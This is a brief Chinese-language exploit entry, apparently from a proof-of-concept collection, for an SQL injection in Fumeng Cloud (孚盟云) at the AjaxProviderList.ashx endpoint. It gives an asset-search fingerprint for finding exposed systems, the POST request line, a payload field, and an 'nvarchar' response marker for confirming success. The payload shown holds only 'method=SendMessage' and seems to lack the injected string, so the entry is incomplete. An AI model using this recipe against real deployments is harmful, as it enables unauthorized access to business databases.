# 孚盟云AjaxProviderList存在SQL注入漏洞

孚盟云 ｜ SQL注入 ｜ —
- **指纹**：`app="孚盟软件-孚盟云"`
- **请求**：`POST /m/Dingding/Ajax/AjaxProviderList.ashx HTTP/1.1`

**Payload**
```
method=SendMessage
```
- **响应特征**：200 nvarchar